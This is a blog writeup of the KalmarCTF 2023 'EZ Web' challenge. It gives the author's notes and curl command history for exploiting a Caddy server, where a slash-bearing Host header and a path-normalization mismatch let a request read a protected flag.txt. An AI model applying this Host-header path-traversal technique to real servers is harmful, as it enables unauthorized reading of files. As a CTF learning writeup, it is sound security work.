<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>KalmarCTF 2023 - EZ Web - Writeup - boxmein</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="I participated in KalmarCTF as part of team Kassipojad :cat2:. One of the best CTFs I&rsquo;ve ever played!!
Here&rsquo;s a writeup of the EZ Web task, or rather a dump of the notes I took:
What do we know? URL https://www.caddy.chal-kalmarc.tf/flag.txt returns 403
https://php.caddy.chal-kalmarc.tf/flag.txt
https://php.caddy.chal-kalmarc.tf/index.php
https://static.caddy.chal-kalmarc.tf/logo_round.svg
Source is included
compose file includes some backup step
Backups folder includes the host
cp -r *.caddy.chal-kalmarc.tf backups/ && rm php.caddy.chal-kalmarc.tf/flag.txt && sleep 1 && caddy run Can use slashes in host"><meta property="og:image" content><meta property="og:title" content="KalmarCTF 2023 - EZ Web - Writeup"><meta property="og:description" content="I participated in KalmarCTF as part of team Kassipojad :cat2:. One of the best CTFs I&rsquo;ve ever played!!
Here&rsquo;s a writeup of the EZ Web task, or rather a dump of the notes I took:
What do we know? URL https://www.caddy.chal-kalmarc.tf/flag.txt returns 403
https://php.caddy.chal-kalmarc.tf/flag.txt
https://php.caddy.chal-kalmarc.tf/index.php
https://static.caddy.chal-kalmarc.tf/logo_round.svg
Source is included
compose file includes some backup step
Backups folder includes the host
cp -r *.caddy.chal-kalmarc.tf backups/ && rm php.caddy.chal-kalmarc.tf/flag.txt && sleep 1 && caddy run Can use slashes in host"><meta property="og:type" content="article"><meta property="og:url" content="https://boxmein.github.io/posts/2023-03-05-kalmarctf-ezweb/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-03-05T00:00:00+00:00"><meta property="article:modified_time" content="2023-03-05T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="KalmarCTF 2023 - EZ Web - Writeup"><meta name=twitter:description content="I participated in KalmarCTF as part of team Kassipojad :cat2:. One of the best CTFs I&rsquo;ve ever played!!
Here&rsquo;s a writeup of the EZ Web task, or rather a dump of the notes I took:
What do we know? URL https://www.caddy.chal-kalmarc.tf/flag.txt returns 403
https://php.caddy.chal-kalmarc.tf/flag.txt
https://php.caddy.chal-kalmarc.tf/index.php
https://static.caddy.chal-kalmarc.tf/logo_round.svg
Source is included
compose file includes some backup step
Backups folder includes the host
cp -r *.caddy.chal-kalmarc.tf backups/ && rm php.caddy.chal-kalmarc.tf/flag.txt && sleep 1 && caddy run Can use slashes in host"><link href=https://boxmein.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://boxmein.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><script src=https://boxmein.github.io/posthog-tag.js></script></head><body><div class=content><header><div class=main><a href=https://boxmein.github.io/>boxmein</a></div><nav></nav></header><main><article><div class=title><h1 class=title>KalmarCTF 2023 - EZ Web - Writeup</h1><div class=meta>Posted on Mar 5, 2023</div></div><section class=body><p>I participated in KalmarCTF as part of team Kassipojad :cat2:. One of the best
CTFs I&rsquo;ve ever played!!</p><p>Here&rsquo;s a writeup of the EZ Web task, or rather a dump of the notes I took:</p><h2 id=what-do-we-know>What do we know?</h2><ul><li><p>URL <a href=https://www.caddy.chal-kalmarc.tf/flag.txt>https://www.caddy.chal-kalmarc.tf/flag.txt</a> returns 403</p></li><li><p><a href=https://php.caddy.chal-kalmarc.tf/flag.txt>https://php.caddy.chal-kalmarc.tf/flag.txt</a></p></li><li><p><a href=https://php.caddy.chal-kalmarc.tf/index.php>https://php.caddy.chal-kalmarc.tf/index.php</a></p></li><li><p><a href=https://static.caddy.chal-kalmarc.tf/logo_round.svg>https://static.caddy.chal-kalmarc.tf/logo_round.svg</a></p></li><li><p>Source is included</p></li><li><p>compose file includes some backup step</p></li><li><p>Backups folder includes the host</p><ul><li><code>cp -r *.caddy.chal-kalmarc.tf backups/ && rm php.caddy.chal-kalmarc.tf/flag.txt && sleep 1 && caddy run</code></li></ul></li><li><p>Can use slashes in host</p></li><li><p>Caddy v1 has an admin API on a separate port</p></li><li><p>Caddy matchers (<code>respond /flag.txt</code>) don&rsquo;t run <code>path.Clean()</code></p></li><li><p>Caddy staticfile server (<code>root /srv/$host/</code>) performs <code>path.Clean()</code></p></li></ul><h2 id=what-to-do>What to do:</h2><ul><li>Make caddy read a file from <code>/srv/backups/php.caddy.chal-kalmarc.tf/flag.txt</code></li><li>Root <code>/srv/{host}</code> looks promising&mldr;<ul><li>Does it trust the Host header?<ul><li>Yes it does</li></ul></li><li>Does it accept slashes?<ul><li>Yes it does</li></ul></li></ul></li></ul><h2 id=started-trying>Started trying&mldr;</h2><pre tabindex=0><code> 4972  curl -H &#39;Host: php.caddy.chal-kalmarc.tf&#39; https://php.caddy.chal-kalmarc.tf/index.php
 4973  curl -k -v -H &#39;Host: php.caddy.chal-kalmarc.tf&#39; https://php.caddy.chal-kalmarc.tf/index.php
 4974  curl -k -v -H &#39;Host: ../flag.txt.caddy.chal-kalmarc.tf&#39; https://php.caddy.chal-kalmarc.tf/
 4975  curl -k -v -H &#39;Host: index.html.caddy.chal-kalmarc.tf&#39; https://php.caddy.chal-kalmarc.tf/
 4976  curl -k -v -H &#39;Host: wow.caddy.chal-kalmarc.tf&#39; https://php.caddy.chal-kalmarc.tf/
 4977  curl -k -v -H &#39;Host: stderr.caddy.chal-kalmarc.tf&#39; https://php.caddy.chal-kalmarc.tf/
 4978  curl -k -v -H &#39;Host: wow&#39; https://php.caddy.chal-kalmarc.tf/
 4979  curl -k -v -H &#39;Host: flag.txt&#39; https://php.caddy.chal-kalmarc.tf/
 4980  curl -k -v  https://backups.php.caddy.chal-kalmarc.tf/flag.txt
 4981  curl -k -v  http://backups.php.caddy.chal-kalmarc.tf/flag.txt
 4982  curl -k -v  http://backups.php.caddy.chal-kalmarc.tf:443/flag.txt
 4983  curl -k -v  http://backups.php.caddy.chal-kalmarc.tf:443/index.php
 4984  curl -k -v  https://backups.php.caddy.chal-kalmarc.tf:443/index.php
 4985  curl -v  https://php.caddy.chal-kalmarc.tf:443/index.php
 4986  curl -vk  https://php.caddy.chal-kalmarc.tf:443/index.php
</code></pre><p>This is not working.</p><h2 id=so-lets-keep-trying-the-backup-idea>So let&rsquo;s keep trying the backup idea:</h2><pre tabindex=0><code> 4987  curl -vk -H &#39;Host: backups.php.caddy.chal-kalmarc.tf&#39; https://php.caddy.chal-kalmarc.tf:443/index.php
 4988  curl -vk -H &#39;Host: backups/php.caddy.chal-kalmarc.tf&#39; https://php.caddy.chal-kalmarc.tf:443/index.php
 4989  curl -vk -H &#39;Host: backups/php.caddy.chal-kalmarc.tf&#39; https://php.caddy.chal-kalmarc.tf:443/flag.txt
 4990  curl -vk -H &#39;Host: backups/php.caddy.chal-kalmarc.tf&#39; https://php.caddy.chal-kalmarc.tf:443/index.php
 4991  curl -vk -H &#39;Host: backups/php.caddy.chal-kalmarc.tf&#39; https://php.caddy.chal-kalmarc.tf:443/./index.php
 4992  curl -vk -H &#39;Host: backups/php.caddy.chal-kalmarc.tf&#39; https://php.caddy.chal-kalmarc.tf:443/&#39;./index.php&#39;
 4993  curl -vk -H &#39;Host: backups/php.caddy.chal-kalmarc.tf&#39; https://php.caddy.chal-kalmarc.tf:443/../index.php
 4994  curl -vk -H &#39;Host: backups/php.caddy.chal-kalmarc.tf/flag.txt&#39; https://php.caddy.chal-kalmarc.tf:443/
 4995  curl -vk -H &#39;Host: backups/php.caddy.chal-kalmarc.tf/flag.txt&#39; https://php.caddy.chal-kalmarc.tf:443/index.php
 4996  curl -vk -H &#39;Host: backups/php.caddy.chal-kalmarc.tf&#39; https://php.caddy.chal-kalmarc.tf:443/f\*
 4997  curl -vk -H &#39;Host: backups/php.caddy.chal-kalmarc.tf&#39; https://php.caddy.chal-kalmarc.tf:443/flag.txt
</code></pre><h2 id=heureka>Heureka</h2><p>Wait, curl, don&rsquo;t normalize the path!</p><p>After a lot of trying:</p><pre tabindex=0><code>‚ùØ curl --path-as-is -vk -H &#39;Host: backups/php.caddy.chal-kalmarc.tf&#39; https://php.caddy.chal-kalmarc.tf:443/./flag.txt
</code></pre><p>So yes, the &ldquo;respond&rdquo; matcher was not normalizing paths the same way the file server was.</p><p>kalmar{th1s-w4s-2x0d4ys-wh3n-C4ddy==2.4}</p><h2 id=learnings>Learnings</h2><ul><li>Even caddy has unique behaviors</li><li>Don&rsquo;t get stuck on the admin endpoint</li></ul></section><div class=post-tags></div></article></main><footer><div style=display:flex></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer></div></body></html>